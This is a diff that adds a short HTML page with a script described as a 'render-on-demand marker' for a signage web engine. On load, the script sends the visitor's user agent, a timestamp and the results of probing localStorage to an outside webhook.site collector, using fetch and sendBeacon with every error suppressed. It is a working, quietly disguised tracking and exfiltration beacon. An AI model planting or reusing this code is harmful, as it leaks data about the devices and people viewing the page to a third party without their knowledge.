@@ -1,0 +1,13 @@
+<html><body><script>
+// r2: render-on-demand marker. Loads only when the signage webengine (re)initialises.
+var SINK = 'https://webhook.site/ed51b195-637c-4806-844e-f23bc704dc65';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,170)), {mode:'no-cors'}); } catch(e) {}
+  try { navigator.sendBeacon(SINK + '/b?t=' + encodeURIComponent(t), String(v).slice(0,150)); } catch(e) {}
+}
+beacon('render', navigator.userAgent.slice(0,95));
+beacon('t', Date.now().toString(36));
+beacon('ls', (function(){ try { localStorage.setItem('r2', String(Date.now())); return 'ok'; } catch(e){ return 'ERR'; } })());
+try { beacon('ls-prev', localStorage.getItem('r2') || 'none'); } catch(e){}
+beacon('done', 'r2');
+</script></body></html>
